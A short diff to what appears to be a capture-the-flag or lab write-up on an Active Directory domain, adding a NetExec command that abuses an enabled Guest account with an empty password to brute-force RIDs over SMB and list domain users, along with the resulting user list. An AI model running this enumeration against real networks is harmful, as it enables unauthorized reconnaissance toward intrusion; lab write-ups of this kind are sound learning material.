@@ -95,9 +95,22 @@ The guest account is enabled!
 
 ### Users
 ```python
-
+nxc smb EC2AMAZ-A5O4OL8.past.local -u 'Guest' -p '' --rid-brute 20000 | grep '(SidTypeUser)' | cut -d '\' -f 2 | cut -d ' ' -f 1 > users.txt
 ```
 
+```python
+cat users.txt 
+Administrator
+Guest
+krbtgt
+DefaultAccount
+tyler
+EC2AMAZ-A5O4OL8$
+APPDEV01$
+WEBDEV01$
+DEV01$
+ryan
+```
 ### Shares
 ```python
 
